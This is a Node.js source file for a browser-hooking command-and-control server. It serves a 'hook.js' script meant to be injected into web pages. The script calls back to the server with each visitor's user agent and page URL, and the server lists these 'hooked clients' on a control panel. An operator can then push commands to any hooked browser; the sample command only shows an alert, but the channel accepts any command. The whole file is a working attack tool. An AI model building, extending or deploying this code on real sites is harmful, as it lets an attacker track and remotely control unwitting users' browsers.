const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Middleware
app.use(bodyParser.json());
app.use(cors());
app.set('view engine', 'ejs');
app.use(express.static('public'));

// In-memory data store for hooked clients
let clients = {};

// Serve the control panel
app.get('/', (req, res) => {
    res.render('index', { clients });
});

// Serve the hook script
app.get('/hook.js', (req, res) => {
    res.type('application/javascript');
    res.send(`
        const socket = io('${req.protocol}://${req.get('host')}');
        socket.emit('hooked', {
            userAgent: navigator.userAgent,
            url: window.location.href
        });

        // Example: Execute commands from server
        socket.on('command', (cmd) => {
            if (cmd.type === 'alert') {
                alert(cmd.message);
            }
        });
    `);
});

// Socket.io handlers
io.on('connection', (socket) => {
    console.log(`Client connected: ${socket.id}`);

    socket.on('hooked', (data) => {
        clients[socket.id] = {
            id: socket.id,
            ...data
        };
        io.emit('updateClients', clients); // Update control panel
        console.log('New client hooked:', data);
    });

    socket.on('sendCommand', ({ clientId, command }) => {
        io.to(clientId).emit('command', command);
    });

    socket.on('disconnect', () => {
        delete clients[socket.id];
        io.emit('updateClients', clients); // Update control panel
        console.log(`Client disconnected: ${socket.id}`);
    });
});

// Start the server
const LOCAL_IP = '10.0.1.33'; // Replace with your actual local IP
const PORT = 3000;

server.listen(PORT, LOCAL_IP, () => {
    console.log(`Server running at http://${LOCAL_IP}:${PORT}`);
});
